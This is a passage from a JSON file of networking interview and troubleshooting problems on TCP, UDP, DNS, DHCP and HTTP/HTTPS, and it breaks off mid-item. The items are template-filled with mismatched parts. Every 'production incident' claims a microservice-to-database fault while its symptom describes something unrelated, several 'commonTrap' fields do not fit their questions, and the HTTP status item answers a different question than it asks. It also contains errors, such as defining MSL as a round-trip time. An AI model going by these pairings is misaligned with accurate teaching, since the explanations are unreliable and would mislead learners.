      "solution": "The TIME_WAIT state serves two critical architectural purposes: 1. Reliable Final ACK Delivery: If the client's final ACK (Step 4) is lost in transit, the server will time out and retransmit its FIN (Step 3). If the client closed immediately instead of waiting in TIME_WAIT, it would respond to the retransmitted FIN with an RST, making the server think the connection terminated abnormally with an error. In TIME_WAIT, the client can re-send the final ACK. 2. Preventing Old Duplicate Segment Confusion: Packets can be delayed in transit by routing loops. Waiting for 2 * MSL (Maximum Segment Lifetime = time for packet to travel + response to return) guarantees that all lingering duplicate packets from the old connection have died and cleared the Internet before a new connection reuses the same IP:Port 4-tuple.",
      "commonTrap": "A TCP connection can only be closed using 4 packets."
    }
  ],
  "tcp-reliability": [
    {
      "id": "tcp-reliability-prob-1",
      "topicId": "tcp-reliability",
      "title": "Troubleshooting TCP Reliability: Sequence Numbers, ACKs & Retransmission: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP Reliability: Sequence Numbers, ACKs & Retransmission.",
      "symptom": "Segments 3, 4, and 5 arrive successfully at the receiver, but Segment 2 is missing.",
      "coreConcept": "Every byte is numbered. The receiver sends cumulative ACKs indicating the next expected byte. The sender retransmits missing segments when its Retransmission Timeout (RTO) expires or upon receiving 3 duplicate ACKs.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP Reliability: Sequence Numbers, ACKs & Retransmission.",
        "2. Inspect the diagnostic logs: A sender transmits Segments 1, 2, 3, 4, 5. Segment 2 is dropped by an overloaded router.",
        "3. Examine the failure mode: TCP retransmits packets immediately upon detecting a single missing ACK.",
        "4. Apply root cause verification: Packets can arrive out of order due to multi-path routing; retransmitting on 1 duplicate ACK causes spurious traffic."
      ],
      "solution": "Correct operational implementation: TCP waits for 3 duplicate ACKs before triggering Fast Retransmit, tolerating minor packet reordering.",
      "commonTrap": "TCP retransmits packets immediately upon detecting a single missing ACK."
    },
    {
      "id": "tcp-reliability-prob-2",
      "topicId": "tcp-reliability",
      "title": "Interview Scenario: What is the difference between Go-Back-N ARQ ...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between Go-Back-N ARQ and Selective Repeat (SACK) in TCP?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP Reliability: Sequence Numbers, ACKs & Retransmission.",
      "coreConcept": "TCP guarantees 100% reliable data transmission across unreliable IP networks through byte sequence numbering, cumulative acknowledgments, and dynamic retransmission timers.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: In traditional Go-Back-N (cumulative ACK without SACK), if segment 2 is lost out of segments 1-5, the receiver can only ..."
      ],
      "solution": "In traditional Go-Back-N (cumulative ACK without SACK), if segment 2 is lost out of segments 1-5, the receiver can only send 'Ack=2'. The sender has no way of knowing segments 3, 4, and 5 arrived safely, so when its timer expires, it must retransmit ALL segments from 2 onward (2, 3, 4, 5), wasting bandwidth. In Selective Repeat (enabled via Selective ACK / SACK, RFC 2018), the receiver sends SACK blocks in the TCP options header detailing non-contiguous ranges that arrived (e.g. SACK: 3000-6000). The sender retransmits ONLY the missing segment 2, preserving network capacity and reducing recovery latency.",
      "commonTrap": "RTO is a fixed hardcoded constant like 200 ms."
    }
  ],
  "flow-control-sliding-window": [
    {
      "id": "flow-control-sliding-window-prob-1",
      "topicId": "flow-control-sliding-window",
      "title": "Troubleshooting TCP Flow Control & Sliding Window Protocol: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP Flow Control & Sliding Window Protocol.",
      "symptom": "The Python script is slow at writing to disk, causing the laptop's OS TCP buffer to fill to capacity.",
      "coreConcept": "The receiver reports its remaining free socket buffer space in every ACK packet via the 16-bit Window Size field (rwnd). The sender never sends more unacknowledged bytes than rwnd.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP Flow Control & Sliding Window Protocol.",
        "2. Inspect the diagnostic logs: A 10 Gbps database server streams a 2 GB table export to a Python script on a developer's laptop.",
        "3. Examine the failure mode: Flow control prevents network router congestion.",
        "4. Apply root cause verification: Flow control protects the END-RECEIVER's buffer, not intermediate routers."
      ],
      "solution": "Correct operational implementation: Flow Control protects the RECEIVER (rwnd); Congestion Control protects the NETWORK (cwnd).",
      "commonTrap": "Flow control prevents network router congestion."
    },
    {
      "id": "flow-control-sliding-window-prob-2",
      "topicId": "flow-control-sliding-window",
      "title": "Interview Scenario: What is the difference between Flow Control a...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between Flow Control and Congestion Control in TCP?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP Flow Control & Sliding Window Protocol.",
      "coreConcept": "TCP Flow Control prevents a fast sender from overwhelming a slow receiver's buffer memory through the Sliding Window Protocol and the Advertised Window (rwnd) field.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Flow Control and Congestion Control protect two completely different entities: 1. Flow Control prevents a fast sender fr..."
      ],
      "solution": "Flow Control and Congestion Control protect two completely different entities: 1. Flow Control prevents a fast sender from overwhelming the SLOW RECEIVER's buffer. It is regulated by the Advertised Window (rwnd) explicitly reported by the receiver in the TCP header. 2. Congestion Control prevents senders from overwhelming the INTERMEDIATE NETWORK routers and transmission links. It is regulated by the Congestion Window (cwnd), which is dynamically calculated by the sender based on observed latency and packet drops (AIMD, Slow Start). At any moment, the sender transmits at: Effective Window = min(rwnd, cwnd).",
      "commonTrap": "The maximum TCP window size is strictly 65,535 bytes forever."
    }
  ],
  "congestion-control": [
    {
      "id": "congestion-control-prob-1",
      "topicId": "congestion-control",
      "title": "Troubleshooting TCP Congestion Control: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP Congestion Control.",
      "symptom": "Both streams flood the router's 50 Mbps WAN uplink, creating bufferbloat and packet drops.",
      "coreConcept": "The sender maintains an internal Congestion Window (cwnd) adjusted dynamically via algorithms: Slow Start (exponential growth), Congestion Avoidance (linear growth), and Fast Recovery.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP Congestion Control.",
        "2. Inspect the diagnostic logs: A user streams a 4K video while another family member starts a massive game download on the same home router.",
        "3. Examine the failure mode: Slow Start is actually slow.",
        "4. Apply root cause verification: Slow Start doubles cwnd every RTT (exponential 2^n growth), making it the fastest growth phase in TCP."
      ],
      "solution": "Correct operational implementation: Slow Start is named because it starts with a small window, but its growth rate is EXPONENTIAL, not slow.",
      "commonTrap": "Slow Start is actually slow."
    },
    {
      "id": "congestion-control-prob-2",
      "topicId": "congestion-control",
      "title": "Interview Scenario: Explain the AIMD (Additive Increase Multiplic...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Explain the AIMD (Additive Increase Multiplicative Decrease) principle in TCP and why it leads to fair bandwidth allocation.",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP Congestion Control.",
      "coreConcept": "TCP Congestion Control dynamically regulates the sender's transmission rate to prevent intermediate network routers and buffers from collapsing due to packet traffic overload.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: AIMD is the mathematical foundation of TCP congestion avoidance. 1. Additive Increase: As long as no packet loss occurs,..."
      ],
      "solution": "AIMD is the mathematical foundation of TCP congestion avoidance. 1. Additive Increase: As long as no packet loss occurs, the sender increases its congestion window linearly by adding 1 MSS every Round Trip Time (cwnd = cwnd + 1). This cautiously probes for available bandwidth. 2. Multiplicative Decrease: The moment packet loss is detected (via 3 duplicate ACKs), the sender cuts its congestion window in half (cwnd = cwnd / 2). If two flows share a bottleneck link, the flow consuming more bandwidth loses more in absolute terms when halved. Over successive sawtooth cycles, this mathematical convergence forces competing connections to settle at an equal, fair share of link capacity while maximizing utilization.",
      "commonTrap": "A packet drop always means a physical cable was damaged."
    }
  ],
  "udp-protocol": [
    {
      "id": "udp-protocol-prob-1",
      "topicId": "udp-protocol",
      "title": "Troubleshooting UDP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over UDP.",
      "symptom": "Player coordinates must update every 7 milliseconds. If packet #40 is dropped, receiving it 100 ms later via TCP retransmission is useless because the player has already moved.",
      "coreConcept": "UDP strips away all state management, providing a minimal 8-byte header containing only source/dest ports, length, and an optional checksum.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with UDP.",
        "2. Inspect the diagnostic logs: A player plays an online multiplayer first-person shooter (Valorant / CS:GO) at 128 tick rate.",
        "3. Examine the failure mode: UDP has zero error detection capability.",
        "4. Apply root cause verification: UDP includes an optional 16-bit checksum covering header, data, and IP pseudo-header."
      ],
      "solution": "Correct operational implementation: UDP CAN detect corrupted bits via checksum (and silently drops bad packets), but it does NOT correct or retransmit them.",
      "commonTrap": "UDP has zero error detection capability."
    },
    {
      "id": "udp-protocol-prob-2",
      "topicId": "udp-protocol",
      "title": "Interview Scenario: Why does DNS use UDP for standard queries, bu...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why does DNS use UDP for standard queries, but switches to TCP for zone transfers?",
      "symptom": "Candidate is asked to provide deep architectural justification for UDP.",
      "coreConcept": "User Datagram Protocol (UDP, RFC 768) is a connectionless, lightweight, unreliable Transport Layer protocol that transmits independent datagrams without handshakes, acknowledgments, or flow control.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: DNS uses UDP (port 53) for standard domain queries because a query fits in a single packet (<512 bytes) and expects a si..."
      ],
      "solution": "DNS uses UDP (port 53) for standard domain queries because a query fits in a single packet (<512 bytes) and expects a single reply. Using UDP avoids the overhead and latency of a TCP 3-way handshake and teardown, allowing root and TLD nameservers to serve millions of queries per second. However, DNS switches to TCP (port 53) in two cases: 1. Zone Transfers (AXFR/IXFR) between primary and secondary nameservers: transferring entire DNS zone databases requires reliable, ordered byte streams without missing records. 2. Responses exceeding 512 bytes (without EDNS0): if a DNS reply is truncated (TC flag set), the client falls back to TCP to receive the full payload.",
      "commonTrap": "UDP is always faster than TCP under all network conditions."
    }
  ],
  "tcp-vs-udp": [
    {
      "id": "tcp-vs-udp-prob-1",
      "topicId": "tcp-vs-udp",
      "title": "Troubleshooting TCP vs UDP Comparison & Protocol Decision Matrix: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP vs UDP Comparison & Protocol Decision Matrix.",
      "symptom": "Video call frames need low latency (<150ms) to feel natural, but text chat messages must never be lost or delivered out of order.",
      "coreConcept": "Evaluating the protocol decision matrix against application requirements: tolerance for packet loss vs tolerance for latency delay.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP vs UDP Comparison & Protocol Decision Matrix.",
        "2. Inspect the diagnostic logs: A development team designs an online tele-health video consultation app with chat functionality.",
        "3. Examine the failure mode: UDP is always better than TCP for video streaming like Netflix and YouTube.",
        "4. Apply root cause verification: Pre-recorded video streaming (Netflix, YouTube) uses TCP (HTTPS) with buffering."
      ],
      "solution": "Correct operational implementation: Pre-recorded streaming buffers ahead using TCP; LIVE interactive calls (Zoom, FaceTime) use UDP to prevent lag.",
      "commonTrap": "UDP is always better than TCP for video streaming like Netflix and YouTube."
    },
    {
      "id": "tcp-vs-udp-prob-2",
      "topicId": "tcp-vs-udp",
      "title": "Interview Scenario: Why does HTTP/3 (QUIC) run over UDP instead o...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why does HTTP/3 (QUIC) run over UDP instead of TCP, given that web pages require 100% reliable data?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP vs UDP Comparison & Protocol Decision Matrix.",
      "coreConcept": "A comprehensive architectural comparison evaluating the trade-offs between TCP (reliable, ordered, connection-oriented) and UDP (fast, lightweight, connectionless).",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: HTTP/2 solved application-layer head-of-line blocking by multiplexing multiple requests over a single TCP connection. Ho..."
      ],
      "solution": "HTTP/2 solved application-layer head-of-line blocking by multiplexing multiple requests over a single TCP connection. However, it introduced 'Transport-Layer Head-of-Line Blocking': if a single TCP packet is dropped, the entire TCP connection freezes while the OS waits for retransmission, stalling all other multiplexed web streams simultaneously. HTTP/3 solves this by migrating to QUIC, which runs on top of UDP. QUIC implements its own lightweight stream multiplexing and retransmission logic directly in user space. If a packet for Stream 1 is lost, Stream 2 and Stream 3 continue loading without delay. Furthermore, QUIC combines connection establishment with TLS 1.3 encryption, enabling 0-RTT connection resumption.",
      "commonTrap": "TCP is more secure than UDP."
    }
  ],
  "ports-and-sockets": [
    {
      "id": "ports-and-sockets-prob-1",
      "topicId": "ports-and-sockets",
      "title": "Troubleshooting Ports, Sockets & Multiplexing / Demultiplexing: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Ports, Sockets & Multiplexing / Demultiplexing.",
      "symptom": "All 5 tabs connect to the same server IP (142.250.72.14) on the same port (443). How does the browser avoid mixing up search results between tabs?",
      "coreConcept": "The OS network stack inspects the 16-bit Destination Port in the TCP/UDP header and demultiplexes incoming payload directly to the socket bound to that process.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Ports, Sockets & Multiplexing / Demultiplexing.",
        "2. Inspect the diagnostic logs: A developer opens 5 separate browser tabs to google.com simultaneously.",
        "3. Examine the failure mode: A server listening on port 443 can only accept 1 client connection at a time.",
        "4. Apply root cause verification: Connections are identified by the FULL 5-TUPLE, not just the server's port."
      ],
      "solution": "Correct operational implementation: A web server on port 443 can handle tens of thousands of concurrent connections as long as each client has a unique IP:Port combination.",
      "commonTrap": "A server listening on port 443 can only accept 1 client connection at a time."
    },
    {
      "id": "ports-and-sockets-prob-2",
      "topicId": "ports-and-sockets",
      "title": "Interview Scenario: How can a web server handle 100,000 concurren...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "How can a web server handle 100,000 concurrent TCP connections on a single listening port (e.g. port 443)?",
      "symptom": "Candidate is asked to provide deep architectural justification for Ports, Sockets & Multiplexing / Demultiplexing.",
      "coreConcept": "A port is a 16-bit numerical identifier (0 to 65535) used by the Transport Layer to direct data to specific software processes. A socket is the unique combination of an IP address and a Port number representing an endpoint of communication.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: A TCP connection is not identified by the server's listening port alone; it is uniquely identified in the OS kernel by t..."
      ],
      "solution": "A TCP connection is not identified by the server's listening port alone; it is uniquely identified in the OS kernel by the 5-Tuple: {Source IP, Source Port, Destination IP, Destination Port, Protocol}. The server's listening socket on 0.0.0.0:443 never exchanges data; its only job is to accept new handshakes. When `accept()` completes, the OS kernel creates a brand new connected socket descriptor with the same Destination Port (443), but bound to the client's unique Source IP and Source Port. As long as the client IP or client ephemeral port is different, the 5-tuple is unique. A server can handle hundreds of thousands of concurrent connections bounded only by RAM, file descriptors (`ulimit -n`), and CPU scheduling.",
      "commonTrap": "TCP and UDP cannot share the same port number on the same computer."
    }
  ],
  "dns-domain-name-system": [
    {
      "id": "dns-domain-name-system-prob-1",
      "topicId": "dns-domain-name-system",
      "title": "Troubleshooting DNS Hierarchy & Resolution Process: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over DNS Hierarchy & Resolution Process.",
      "symptom": "Some customers in Europe still hit the old AWS server for 2 hours after the DNS change was published.",
      "coreConcept": "A tree hierarchy of nameservers (Root '.', Top-Level Domain '.com', Authoritative 'example.com') processes recursive queries and caches answers globally.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with DNS Hierarchy & Resolution Process.",
        "2. Inspect the diagnostic logs: A startup migrates its backend servers from AWS to GCP and updates its domain's DNS A Record.",
        "3. Examine the failure mode: There are only 13 physical DNS root server computers in the world.",
        "4. Apply root cause verification: There are 13 logical IP addresses (A.root-servers.net to M.root-servers.net), but hundreds of physical servers."
      ],
      "solution": "Correct operational implementation: Over 1,500 physical server nodes exist globally, distributed across the 13 logical IP addresses using BGP Anycast routing.",
      "commonTrap": "There are only 13 physical DNS root server computers in the world."
    },
    {
      "id": "dns-domain-name-system-prob-2",
      "topicId": "dns-domain-name-system",
      "title": "Interview Scenario: What is the difference between an Iterative D...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between an Iterative DNS query and a Recursive DNS query?",
      "symptom": "Candidate is asked to provide deep architectural justification for DNS Hierarchy & Resolution Process.",
      "coreConcept": "The Domain Name System (DNS, RFC 1035) is the global hierarchical decentralized naming database that translates human-readable domain names (e.g. google.com) into machine-routable IP addresses (e.g. 142.250.72.14).",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: In a Recursive Query, the client asks a DNS server (typically the local ISP or recursive resolver like 8.8.8.8) to do al..."
      ],
      "solution": "In a Recursive Query, the client asks a DNS server (typically the local ISP or recursive resolver like 8.8.8.8) to do all the work: 'Please resolve this domain for me and return the final IP address or an error; do not give me referrals.' The resolver takes full responsibility, querying root, TLD, and authoritative servers on behalf of the client. In an Iterative Query, the client asks a server: 'Give me the answer if you know it; otherwise, return the best referral (the IP of the next nameserver down the tree) so I can query it myself.' Root and TLD nameservers handle only iterative queries to protect their CPU and network resources from maintaining millions of recursive state sessions.",
      "commonTrap": "A CNAME record can point directly to an IP address."
    }
  ],
  "dhcp-protocol": [
    {
      "id": "dhcp-protocol-prob-1",
      "topicId": "dhcp-protocol",
      "title": "Troubleshooting DHCP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over DHCP.",
      "symptom": "The laptop has no IP address, no idea what subnet it is on, and no gateway configured.",
      "coreConcept": "The 4-step DORA broadcast/unicast handshake: Discover, Offer, Request, Acknowledge.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with DHCP.",
        "2. Inspect the diagnostic logs: A student opens their laptop at a university library and joins the campus Wi-Fi.",
        "3. Examine the failure mode: DHCP uses TCP to ensure reliable IP assignment.",
        "4. Apply root cause verification: A client without an IP address cannot perform a TCP 3-way handshake."
      ],
      "solution": "Correct operational implementation: DHCP operates over UDP because broadcast communication requires connectionless transport.",
      "commonTrap": "DHCP uses TCP to ensure reliable IP assignment."
    },
    {
      "id": "dhcp-protocol-prob-2",
      "topicId": "dhcp-protocol",
      "title": "Interview Scenario: What is a 'Rogue DHCP Server' attack and how ...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is a 'Rogue DHCP Server' attack and how does DHCP Snooping prevent it?",
      "symptom": "Candidate is asked to provide deep architectural justification for DHCP.",
      "coreConcept": "DHCP (RFC 2131) is an application-layer network management protocol operating over UDP (ports 67/68) that automatically assigns IP addresses, subnet masks, default gateways, and DNS servers to client devices on a local network.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: A Rogue DHCP Server attack occurs when an attacker connects an unauthorized DHCP server (or rogue Wi-Fi router) to a net..."
      ],
      "solution": "A Rogue DHCP Server attack occurs when an attacker connects an unauthorized DHCP server (or rogue Wi-Fi router) to a network switch. When clients broadcast DHCPDISCOVER, the rogue server responds faster than the legitimate network server, assigning clients a malicious Default Gateway IP (the attacker's machine) and malicious DNS server. All client internet traffic is intercepted in a Man-in-the-Middle (MITM) attack. Defense: DHCP Snooping on Layer 2 managed switches. The switch administrator configures the legitimate uplink port to the real DHCP server as 'Trusted', and all user access ports as 'Untrusted'. The switch hardware automatically inspects incoming traffic on Untrusted ports and drops any DHCPOFFER or DHCPACK packets, preventing rogue servers from answering clients.",
      "commonTrap": "The client keeps its DHCP IP address permanently until reboot."
    }
  ],
  "http-protocol": [
    {
      "id": "http-protocol-prob-1",
      "topicId": "http-protocol",
      "title": "Troubleshooting HTTP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over HTTP.",
      "symptom": "Under HTTP/1.1, the browser is limited to 6 parallel TCP connections per domain, causing queuing delays.",
      "coreConcept": "HTTP evolved from single-request connections (1.0) to persistent Keep-Alive connections (1.1), binary multiplexing over one TCP stream (2.0), and QUIC over UDP (3.0).",
      "analysis": [
        "1. Isolate the affected OSI layer associated with HTTP.",
        "2. Inspect the diagnostic logs: A modern web page loads 100 small icons, scripts, and stylesheet files.",
        "3. Examine the failure mode: HTTP/2 completely eliminated Head-of-Line (HoL) blocking under all circumstances.",
        "4. Apply root cause verification: HTTP/2 eliminated application-layer HoL blocking, but suffered from TCP-layer HoL blocking."
      ],
      "solution": "Correct operational implementation: If a single packet drops on HTTP/2's single TCP connection, ALL multiplexed streams stall until retransmission. HTTP/3 solves this with QUIC.",
      "commonTrap": "HTTP/2 completely eliminated Head-of-Line (HoL) blocking under all circumstances."
    },
    {
      "id": "http-protocol-prob-2",
      "topicId": "http-protocol",
      "title": "Interview Scenario: What is Head-of-Line (HoL) Blocking and how d...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is Head-of-Line (HoL) Blocking and how did HTTP/2 and HTTP/3 solve it differently?",
      "symptom": "Candidate is asked to provide deep architectural justification for HTTP.",
      "coreConcept": "HTTP is the stateless, application-layer request-response protocol powering the World Wide Web, governing how clients request resources and how servers serve web pages and APIs.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Head-of-Line (HoL) Blocking occurs when the head of a line of data blocks all subsequent items behind it. 1. In HTTP/1.1..."
      ],
      "solution": "Head-of-Line (HoL) Blocking occurs when the head of a line of data blocks all subsequent items behind it. 1. In HTTP/1.1, HoL blocking happened at the application layer: over a single TCP connection, the client had to wait for the server to finish responding to Request 1 before Request 2 could be processed. Browsers worked around this by opening up to 6 separate TCP connections per domain. 2. HTTP/2 solved application-layer HoL blocking by introducing binary framing and multiplexing: multiple requests and responses are broken into frames with Stream IDs and interleaved over a single TCP connection concurrently. However, HTTP/2 introduced Transport-Layer HoL blocking: because all streams share one TCP connection, if one packet drops on the link, TCP freezes the entire socket buffer, stalling all 100 streams until retransmission. 3. HTTP/3 solved this by replacing TCP with QUIC over UDP. Each stream in QUIC has independent packet loss recovery. If Stream 1 loses a packet, Streams 2 through 100 continue downloading without any stall.",
      "commonTrap": "HTTP is an encrypted secure protocol."
    }
  ],
  "https-protocol": [
    {
      "id": "https-protocol-prob-1",
      "topicId": "https-protocol",
      "title": "Troubleshooting HTTPS Architecture, Encryption & Certificate Authorities: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over HTTPS Architecture, Encryption & Certificate Authorities.",
      "symptom": "An attacker runs a packet sniffer capturing every radio frame transmitted by the user's laptop.",
      "coreConcept": "Uses asymmetric public-key cryptography to authenticate the server and negotiate a shared secret key, followed by fast symmetric cipher encryption for the actual session data.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with HTTPS Architecture, Encryption & Certificate Authorities.",
        "2. Inspect the diagnostic logs: A user logs into their online banking portal from an unsecured public airport Wi-Fi network.",
        "3. Examine the failure mode: HTTPS encrypts the entire session using asymmetric RSA public-key encryption.",
        "4. Apply root cause verification: Asymmetric encryption is computationally expensive and slow for large data transfers."
      ],
      "solution": "Correct operational implementation: HTTPS uses hybrid encryption: asymmetric cryptography during handshake, followed by high-speed symmetric ciphers (AES) for payload.",
      "commonTrap": "HTTPS encrypts the entire session using asymmetric RSA public-key encryption."
    },
    {
      "id": "https-protocol-prob-2",
      "topicId": "https-protocol",
      "title": "Interview Scenario: What is a Digital Certificate (X.509) and how...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is a Digital Certificate (X.509) and how does the browser verify the 'Chain of Trust'?",
      "symptom": "Candidate is asked to provide deep architectural justification for HTTPS Architecture, Encryption & Certificate Authorities.",
      "coreConcept": "HTTPS (Hypertext Transfer Protocol Secure, RFC 2818) is the secure encrypted version of HTTP, running over port 443 by encapsulating standard HTTP traffic inside a Transport Layer Security (TLS) cryptographic tunnel.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: An X.509 Digital Certificate is a cryptographically signed electronic passport issued by a trusted Certificate Authority..."
      ],
      "solution": "An X.509 Digital Certificate is a cryptographically signed electronic passport issued by a trusted Certificate Authority (CA) that binds a domain name (e.g. google.com) to its public encryption key. The browser verifies the certificate via a hierarchical 'Chain of Trust': 1. The server presents its End-Entity (Leaf) certificate. 2. The browser checks the digital signature on the leaf certificate, which was signed by an Intermediate CA's private key. 3. The browser validates the intermediate certificate, which was signed by a Root CA. 4. The browser compares the Root CA against its pre-installed, hardened 'Root CA Trust Store' embedded in the operating system (e.g. macOS keychain or Windows certificate store). If any link in the cryptographic signature chain is expired, revoked (via CRL/OCSP), or unsigned by a trusted root, the browser displays a severe security warning.",
      "commonTrap": "An HTTPS green padlock means the website is safe from phishing or scams."
    }
  ],
  "http-methods": [
    {
      "id": "http-methods-prob-1",
      "topicId": "http-methods",
      "title": "Troubleshooting HTTP Request Methods, Idempotency & Safety: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over HTTP Request Methods, Idempotency & Safety.",
      "symptom": "If the client automated retry sends another POST /charge request, the customer will be double-charged $200.",
      "coreConcept": "RFC 7231 formalizes exact semantics for safe, idempotent, and non-idempotent verbs, allowing network clients to safely retry failed requests.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with HTTP Request Methods, Idempotency & Safety.",
        "2. Inspect the diagnostic logs: A payment gateway experiences a network timeout while charging a customer $100 for an airline ticket.",
        "3. Examine the failure mode: POST and PUT are completely interchangeable.",
        "4. Apply root cause verification: PUT is idempotent (full replacement); POST is non-idempotent (creates new resource with auto-generated ID)."
      ],
      "solution": "Correct operational implementation: PUT replaces the resource at a known URI; POST creates a child resource under a collection URI.",
      "commonTrap": "POST and PUT are completely interchangeable."
    },
    {
      "id": "http-methods-prob-2",
      "topicId": "http-methods",
      "title": "Interview Scenario: What does it mean for an HTTP method to be 'I...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What does it mean for an HTTP method to be 'Idempotent' versus 'Safe'?",
      "symptom": "Candidate is asked to provide deep architectural justification for HTTP Request Methods, Idempotency & Safety.",
      "coreConcept": "HTTP methods (verbs) define the desired action to be performed on a target web resource, classified by their semantics, safety (read-only), and idempotency (repeatability without side effects).",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Safe Method: An HTTP method is Safe if it is read-only and does not alter the server's state (it produces no side eff..."
      ],
      "solution": "1. Safe Method: An HTTP method is Safe if it is read-only and does not alter the server's state (it produces no side effects). GET, HEAD, and OPTIONS are safe methods. Safe methods can be pre-fetched, cached, and crawled by search engines without risk. 2. Idempotent Method: An HTTP method is Idempotent if making multiple identical requests has the exact same effect on the server state as making a single request (mathematically, f(f(x)) = f(x)). GET, PUT, DELETE, HEAD, and OPTIONS are idempotent. For example, executing `PUT /user/1 {name: 'Alice'}` five times leaves the user named Alice every time. In contrast, executing `POST /orders` five times creates five separate orders. Browsers can automatically retry idempotent requests upon network timeout without asking the user.",
      "commonTrap": "DELETE is not idempotent because the second request returns 404 Not Found instead of 200 OK."
    }
  ],
  "http-status-codes": [
    {
      "id": "http-status-codes-prob-1",
      "topicId": "http-status-codes",
      "title": "Troubleshooting HTTP Status Codes: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over HTTP Status Codes.",
      "symptom": "What status code does the client receive from NGINX?",
      "coreConcept": "5 distinct categories: 1xx (Informational), 2xx (Success), 3xx (Redirection), 4xx (Client Errors), 5xx (Server Errors).",
      "analysis": [
        "1. Isolate the affected OSI layer associated with HTTP Status Codes.",
        "2. Inspect the diagnostic logs: A microservice behind an NGINX reverse proxy crashes with an uncaught NullPointerException.",
        "3. Examine the failure mode: 401 Unauthorized means you are logged in but lack admin permission.",
        "4. Apply root cause verification: RFC 7235 explicitly defines 401 as 'Unauthenticated' (missing or invalid credentials)."
      ],
      "solution": "Correct operational implementation: 401 means Unauthenticated (not logged in); 403 Forbidden means Unauthorized (logged in, but lacking permission).",
      "commonTrap": "401 Unauthorized means you are logged in but lack admin permission."
    },
    {
      "id": "http-status-codes-prob-2",
      "topicId": "http-status-codes",
      "title": "Interview Scenario: What is the architectural difference between ...",
      "difficulty": "Hard",
